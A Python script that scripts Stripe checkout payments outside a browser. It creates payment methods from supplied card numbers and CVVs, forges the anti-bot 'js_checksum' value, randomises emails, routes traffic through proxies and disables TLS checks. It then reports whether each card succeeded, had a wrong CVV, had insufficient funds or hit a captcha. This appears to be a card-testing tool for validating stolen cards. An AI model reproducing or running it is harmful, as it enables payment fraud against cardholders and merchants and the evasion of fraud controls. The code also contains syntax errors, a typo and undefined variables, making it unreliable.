import requests, itertools, base64, random, string, urllib3

urllib3.disable_warnings()

def xor_encode(plaintext):
    #pass pm
    key = itertools.cycle([5])
    ciphertext = ''.join(chr(ord(c) ^ next(key)) for c in plaintext)
    return ciphertext

def encodebase64(text):
    #pass pm base64 encode
    text_bytes = text.encode('utf-8')
    encoded_bytes = base64.b64encode(text_bytes)
    encoded_text = encoded_bytes.decode('utf-8')
    return encoded_text.replace("/", "%2F").replace("+", "%2B")


def getJSCheckSum(pm):
    js_checksum_json='{"id":"'+pm+'"}   '
    return encodebase64(xor_encode(js_checksum_json))

def getInitCheckSum(pk, cs, proxy=None):
    url=f"https://api.stripe.com/v1/payment_pages/{cs}?key={pk}&eid=NA"
    
    r=requests.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}, proxies=proxy, verify=False)
   
   if r.status_code==200:
        return True, r.json()["init_checksum"]
    return False, r.json().get("error").get("message")


def rndEmail(length=10):
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'example.com'])
    email = f'{random_string}@{domain}'
    return email

def getPM(ccn, mon, year, cvv, pk, email=None, proxy=None):
    if email==None:
        email=rndEmail()
    url="https://api.stripe.com/v1/payment_methods"
    
    data=f"type=card&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&billing_details[name]=Vaibhav+Chandra&billing_details[email]=b.ren.n.a.nspen.cm.p%40gmail.com&billing_details[address][country]=US&billing_details[address][postal_code]=12758&guid=b81b6dc4-0199-491b-88b6-232e590f1641e7a346&muid=ef4fdeb9-ff7c-406a-8cfc-f52ee65f8e9bdfe21a&sid=0eaca5bb-ba6a-4e5d-af93-515e6f65a33ab16013&key={pk}&payment_user_agent=stripe.js%2F0caf90759d%3B+stripe-js-v3%2F0caf90759d%3B+checkout"
    
    

    headers={
    "accept": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded",
    "referer": "https://checkout.stripe.com/",
    "origin": "https://checkout.stripe.com"
    }

    r=requests.post(url, data=data, headers=headers, proxies=proxy, verify=False) 
    
    if r.status_code==200:
        return True, r.json().get("id")
    else:
        return False, r.json().get("error").get("message")


def sendConfirm(pk, cs, pm, amt, js_checksum, init_checksum, proxy=None):

    headers={
    "accept": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded",
    "referer": "https://checkout.stripe.com/",
    "origin": "https://checkout.stripe.com"
    }
    
    url=f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
    
    data=f"eid=NA&payment_method={pm}&expected_amount={amt}&last_displayed_line_item_group_details[subtotal]=3443&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&guid=NA&muid=NA&sid=NA&key={pk}&version=0caf90759d&init_checksum={init_checksum}&js_checksum={js_checksum}"
    
    r=requests.post(url, headers=headers, data=data, proxies=proxy, verify=False)
    
    if r.status_code==200 and r.json().get("status")=="succeeded":
        return True, "succeeded"
    elif "intent_confirmation_challenge" in r.text:
        return False, "HCaptcha Detected"
    else:
        msg=r.json().get("error").get("message")
        if "Your card's security code is incorrect." in msg:
                return False, msg
        elif "Your card has insufficient funds." in msg:
            return False, mss
        return False, msg



_, pm_id=getPM(ccn, mon, year, cvv, pk, "ex@xyz.com"y)

js_checksum=getJSCheckSum(pm_id)

_, init_checksum=getInitCheckSum(pk, cs)

code, resp=sendConfirm(pk, cs, pm_id, amt, js_checksum, init_checksum)

print(code, resp)



